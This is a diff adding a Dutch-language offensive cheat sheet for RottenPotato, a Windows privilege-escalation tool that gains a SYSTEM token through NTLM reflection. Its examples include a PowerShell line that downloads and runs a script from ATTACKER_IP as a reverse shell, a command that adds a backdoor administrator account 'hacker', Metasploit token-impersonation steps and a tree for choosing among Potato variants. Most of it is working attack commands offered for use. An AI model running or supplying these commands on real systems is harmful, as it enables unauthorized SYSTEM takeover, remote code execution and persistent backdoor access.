@@ -1,0 +1,36 @@
+# RottenPotato — Originele Potato privilege escalation (NTLM reflection)
+# Oudste Potato variant: misbruikt NTLM reflection via DCOM om SYSTEM token te verkrijgen
+#
+# === Syntax ===
+# MSFRottenPotato.exe <command>
+#
+# === Vereisten ===
+# SeImpersonatePrivilege of SeAssignPrimaryTokenPrivilege
+# Werkt op: Windows 7/8, Server 2008/2012 (oudere systemen)
+# Op nieuwere systemen geblokt — gebruik PrintSpoofer, SweetPotato of GodPotato
+#
+# === Voorbeelden ===
+
+# Basiscommando als SYSTEM
+MSFRottenPotato.exe "cmd /c whoami"
+
+# Reverse shell
+MSFRottenPotato.exe "cmd /c powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"
+
+# Gebruiker aanmaken
+MSFRottenPotato.exe "cmd /c net user hacker P@ssw0rd123 /add && net localgroup Administrators hacker /add"
+
+# Via Metasploit (na meterpreter sessie)
+# meterpreter> upload rottenpotato.exe
+# meterpreter> execute -f rottenpotato.exe -a "cmd /c whoami"
+# meterpreter> use incognito
+# meterpreter> impersonate_token "NT AUTHORITY\SYSTEM"
+
+# === Potato-familie beslisboom ===
+# 1. Nieuw systeem (Server 2019+/Win10+)  → GodPotato of PrintSpoofer
+# 2. Server 2016/Win10 ouder              → SweetPotato of PrintSpoofer
+# 3. Server 2008-2012/Win7-8              → JuicyPotato of RottenPotato
+# 4. Als één niet werkt                   → probeer de volgende variant
+
+# NOTE: RottenPotato is verouderd — gebruik bij voorkeur modernere alternatieven
+# NOTE: JuicyPotato is de verbeterde opvolger van RottenPotato
